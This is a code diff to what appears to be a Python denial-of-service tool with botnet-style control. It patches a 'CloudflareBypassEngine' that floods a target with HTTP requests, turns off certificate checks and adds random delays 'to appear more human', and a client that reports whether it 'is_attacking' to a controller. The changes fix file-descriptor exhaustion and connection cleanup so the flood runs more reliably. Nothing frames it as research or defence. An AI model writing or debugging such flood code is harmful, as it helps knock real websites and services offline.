@@ -139,21 +139,21 @@ class CloudflareBypassEngine:
         print(f"[L7] Starting CLOUDFLARE BYPASS {method} flood on {target}")
         self.running = True
         
-        # Create connection pools with SSL/TLS
-        pool_count = 50
+        # Reduce pool count to avoid file descriptor issues
+        pool_count = 10  # Changed from 50
         for _ in range(pool_count):
             pool = urllib3.PoolManager(
-                maxsize=1000,
+                maxsize=100,  # Reduced from 1000
                 retries=urllib3.Retry(
-                    total=3,
+                    total=2,  # Reduced from 3
                     backoff_factor=0.2,
                     status_forcelist=[429, 500, 502, 503, 504],
                     raise_on_status=False
                 ),
-                timeout=urllib3.Timeout(connect=5, read=10),
+                timeout=urllib3.Timeout(connect=3, read=5),  # Reduced timeouts
                 cert_reqs='CERT_NONE',
                 assert_hostname=False,
-                num_pools=100,
+                num_pools=10,  # Reduced from 100
                 block=False
             )
             self.pools.append(pool)
@@ -253,12 +253,24 @@ class CloudflareBypassEngine:
                         else:
                             self.stats['failed'] += 1
                     
-                    response.drain_conn()
+                    # Properly close the response
+                    try:
+                        response.drain_conn()
+                        response.release_conn()
+                    except:
+                        pass
+                    
                     request_count += 1
                     
                     # Small delay to appear more human
                     time.sleep(random.uniform(0.001, 0.005))
                     
+                except OSError as e:
+                    # Handle file descriptor exhaustion gracefully
+                    if "Too many open files" in str(e):
+                        time.sleep(0.1)  # Back off when hitting limits
+                    with self.stats_lock:
+                        self.stats['failed'] += 1
                 except Exception as e:
                     with self.stats_lock:
                         self.stats['failed'] += 1
@@ -277,12 +289,13 @@ class CloudflareBypassEngine:
             for future in futures:
                 future.cancel()
         
-        # Cleanup pools
+        # Cleanup pools properly
         for pool in self.pools:
             try:
                 pool.clear()
             except:
                 pass
+        self.pools = []  # Clear the pool list
         
         return self.stats.copy()
     
@@ -652,25 +665,33 @@ class Layer7Client:
                         except:
                             pass
                     
-                    # Report stats
-                    cpu_usage = psutil.cpu_percent(interval=1)
-                    memory_usage = psutil.virtual_memory().percent
-                    
-                    stats = {
-                        'cpu_usage': cpu_usage,
-                        'memory_usage': memory_usage,
-                        'timestamp': datetime.now().isoformat(),
-                        'is_attacking': self.running
-                    }
-                    
+                    # Report stats - avoid file descriptor issues
                     try:
+                        cpu_usage = psutil.cpu_percent(interval=0.1)
+                        memory_usage = psutil.virtual_memory().percent
+                        
+                        stats = {
+                            'cpu_usage': cpu_usage,
+                            'memory_usage': memory_usage,
+                            'timestamp': datetime.now().isoformat(),
+                            'is_attacking': self.running
+                        }
+                        
                         self.sio.emit('client_stats', {'stats': stats})
+                    except OSError:
+                        # Skip this heartbeat if we hit file descriptor limit
+                        pass
                     except:
                         pass
                 
                 time.sleep(10)
+            except OSError:
+                # Skip this heartbeat cycle if file descriptors are exhausted
+                time.sleep(10)
             except Exception as e:
-                print(f"⚠️ Heartbeat error: {e}")
+                # Only print non-file-descriptor errors
+                if "Too many open files" not in str(e):
+                    print(f"⚠️ Heartbeat error: {e}")
                 time.sleep(10)
     
     def connect(self):
